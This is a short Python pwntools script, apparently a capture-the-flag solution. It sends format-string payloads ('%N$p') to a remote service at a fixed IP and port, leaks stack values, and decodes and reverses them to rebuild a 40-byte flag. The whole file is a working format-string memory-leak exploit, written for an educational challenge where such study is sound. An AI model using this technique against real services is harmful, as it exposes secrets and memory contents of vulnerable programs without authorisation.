from pwn import *

# avoid printing Opening connection and Closed connection
context.log_level = 'warn'

s = ''
found = False
# Flag length is 40 bytes, pointer is 8 bytes
# we need to do 5 times
flag_part = 5
flag = ''
for i in range(100):
    try:
        r = remote('140.113.24.241', 30172)
        r.sendline('%{}$p'.format(i).encode())
        s = r.recv()
        # fromhex eat string, we need to decode it and discard 0x
        # fromhex return byte type, so we need to decode it
        # The text is reversed. We need to reverse it.
        # binascii.hexlify can also do this
        answer = bytes.fromhex(s.decode()[2::]).decode()[::-1]
        r.close()

        if 'FLAG' in answer:
            found = True
        if found:
            flag += answer
            flag_part -= 1
            if flag_part == 0:
                break
    except Exception as e:
        #print(e)
        r.close()
        continue
print(flag)